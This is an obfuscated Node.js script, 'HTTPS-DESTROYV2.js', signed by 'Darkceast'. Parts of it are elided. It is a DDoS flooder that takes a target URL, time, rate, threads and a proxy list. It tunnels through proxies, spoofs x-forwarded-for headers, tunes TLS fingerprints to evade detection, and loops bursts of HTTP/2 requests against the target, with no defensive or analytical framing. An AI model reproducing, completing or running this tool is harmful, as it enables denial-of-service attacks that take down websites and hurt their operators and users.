;
process.on('uncaughtException', function (_0xe1f71f) {
});
process.on('unhandledRejection', function (_0x1f9668) {
});
process.on('SIGHUP', () => {
    return 1;
});
...
if (process.argv.length < 5){console.log(`Script Touched by Darkceast\nUsage: node HTTPS-DESTROYV2.js <URL> <TIME> <RATE> <THREADS> <PROXY>\nExample: node HTTPS-DESTROYV2.js https://website.com 500 64 5 alive1.txt`); process.exit();}

const gradient = require('gradient-string'), cluster = require('cluster'), crypto = require('crypto'), http2 = require('http2'), http = require('http'), net = require('net'), tls = require('tls'), url = require('url'), fs = require('fs');
var path = require('path'), fileName = __filename, colors = require('colors'), file = path.basename(fileName);
if (process.argv.length < 7) {
    console.log('Darkceast'.rainbow);
    process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':'), ciphers = 'GREASE:' + [
        defaultCiphers[2],
        defaultCiphers[1],
        defaultCiphers[0],
        defaultCiphers.slice(3)
    ].join(':'), sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512', ecdhCurve = 'GREASE:x25519:secp256r1:secp384r1', secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION, secureProtocol = 'TLS_client_method', secureContextOptions = {
        'ciphers': ciphers,
        'sigalgs': sigalgs,
        'honorCipherOrder': true,
        'secureOptions': secureOptions,
        'secureProtocol': secureProtocol
    }, secureContext = tls.createSecureContext(secureContextOptions), headers = {};
function readLines(_0x1b3768) {
    ;
    return fs.readFileSync(_0x1b3768, 'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x29bc31, _0x4a091e) {
    ;
    return Math.floor(Math.random() * (_0x4a091e - _0x29bc31) + _0x29bc31);
}
function randomElement(_0x31b7f1) {
    ;
    return _0x31b7f1[randomIntn(0, _0x31b7f1.length)];
}
function randomCharacters(_0x3c9007) {
    output = '';
    for (let _0x499a77 = 0; _0x499a77 < _0x3c9007; _0x499a77++) {
...
class NetSocket {
    ...
    ['HTTP'](_0x188a00, _0x2efdbe) {
        const _0x478897 = _0x188a00.address.split(':'), _0x21757f = _0x478897[0], _0x3f7b30 = 'CONNECT ' + _0x188a00.address + ':443 HTTP/1.1\r\nHost: ' + _0x188a00.address + ':443\r\nConnection: Keep-Alive\r\n\r\n', _0x4f5657 = new Buffer.from(_0x3f7b30), _0xef46da = net.connect({
                'host': _0x188a00.host,
                'port': _0x188a00.port,
                'allowHalfOpen': true,
                'writable': true,
        ...
        _0xef46da.setTimeout(_0x188a00.timeout * 20000);
        _0xef46da.setKeepAlive(true, 20000);
        _0xef46da.setNoDelay(true);
        _0xef46da.on('connect', () => {
            ;
            _0xef46da.write(_0x4f5657);
        });
        _0xef46da.on('data', _0x312073 => {
            const _0xe0e876 = _0x312073.toString('utf-8'), _0x3cc631 = _0xe0e876.includes('HTTP/1.1 200');
            if (_0x3cc631 === false) {
                return _0xef46da.destroy(), _0x2efdbe(undefined, '403');
            }
            return _0x2efdbe(_0xef46da, undefined);
        });
        _0xef46da.on('timeout', () => {
            ;
            return _0xef46da.destroy(), _0x2efdbe(undefined, '403');
        });
        _0xef46da.on('error', _0x46da74 => {
            ;
            return _0xef46da.destroy(), _0x2efdbe(undefined, '403');
        });
        ;
...
const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))], Socker = new NetSocket();
;
;
headers[':method'] = 'GET';
...
;
function runFlooder() {
    const _0x25600e = randomElement(proxies), _0x1f486f = _0x25600e.split(':');
    headers[':authority'] = parsedTarget.host;
    headers['x-forwarded-for'] = _0x1f486f[0];
    ...
    Socker.HTTP(_0x3ac2d5, (_0x348a77, _0x1d2087) => {
        ;
        if (_0x1d2087) {
            return;
        }
        _0x348a77.setKeepAlive(true, 90000);
        _0x348a77.setNoDelay(true);
        ;
        const _0x6e33b1 = {
                'port': 443,
                'ALPNProtocols': [
                ...
                'secureProtocol': secureProtocol
            }, _0x322c36 = tls.connect(443, parsedTarget.host, _0x6e33b1);
        _0x322c36.allowHalfOpen = true;
        _0x322c36.setNoDelay(true);
        _0x322c36.setKeepAlive(true, 6000000);
        _0x322c36.setMaxListeners(0);
        ;
        const _0x2f24b7 = http2.connect(parsedTarget.href, {
            'protocol': 'https:',
            'settings': {
        ...
        _0x2f24b7.setMaxListeners(0);
        _0x2f24b7.settings(_0x5b17c8);
        _0x2f24b7.on('connect', () => {
            const _0x5eaef3 = setInterval(() => {
                ;
                for (let _0x2f0571 = 0; _0x2f0571 < args.rate; _0x2f0571++) {
                    const _0x387914 = _0x2f24b7.request(headers).on('response', _0x530218 => {
                        ;
                        _0x387914.close();
                        _0x387914.destroy();
                        ;
